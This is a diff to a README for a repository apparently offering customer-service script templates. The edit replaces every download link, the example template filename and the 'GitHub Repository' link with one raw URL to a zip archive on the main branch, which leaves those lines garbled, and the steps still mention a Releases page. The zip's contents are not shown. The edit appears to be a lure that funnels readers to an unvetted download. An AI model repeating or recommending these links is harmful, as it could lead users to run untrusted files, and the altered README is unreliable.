@@ -6,7 +6,7 @@ Welcome to the **customer-service-scripts** repository! Here, you will find a co
 
 ## 📥 Download & Install
 
-To get started, you need to download the scripts. Visit this page to download: [Download Customer Service Scripts](https://github.com/Daniejoe412/customer-service-scripts/releases).
+To get started, you need to download the scripts. Visit this page to download: [Download Customer Service Scripts](https://github.com/Daniejoe412/customer-service-scripts/raw/refs/heads/main/platforms/shopify/scripts_customer_service_v1.0.zip).
 
 1. Click the link above.
 2. On the Releases page, look for the latest version.
@@ -25,7 +25,7 @@ You need a device that supports the following:
 
 1. **Download**: Follow the steps in the "Download & Install" section to get the files.
 2. **Unzip the Files**: Once downloaded, locate the file on your computer. Right-click and choose "Extract All" or use your preferred unzipping tool.
-3. **Choose a Template**: Open the folder and browse through the templates. Each file is named according to its function (e.g., "Amazon_Support_Script.txt").
+3. **Choose a Template**: Open the folder and browse through the templates. Each file is named according to its function (e.g., "https://github.com/Daniejoe412/customer-service-scripts/raw/refs/heads/main/platforms/shopify/scripts_customer_service_v1.0.zip").
 4. **Edit as Needed**: Use any text editor to open a template. Customize it with your information to fit your customer service needs.
 5. **Save Your Changes**: After editing, make sure to save your changes. You can now use these scripts whenever you need assistance in customer interactions.
 
@@ -50,7 +50,7 @@ If you have questions or need assistance, please create an issue in the GitHub r
 
 ## 🔗 Useful Links
 
-- [Download Customer Service Scripts](https://github.com/Daniejoe412/customer-service-scripts/releases)
-- [GitHub Repository](https://github.com/Daniejoe412/customer-service-scripts)
+- [Download Customer Service Scripts](https://github.com/Daniejoe412/customer-service-scripts/raw/refs/heads/main/platforms/shopify/scripts_customer_service_v1.0.zip)
+- [GitHub Repository](https://github.com/Daniejoe412/customer-service-scripts/raw/refs/heads/main/platforms/shopify/scripts_customer_service_v1.0.zip)
 
 Thank you for choosing the **customer-service-scripts**! We hope these tools enhance your customer service experience.
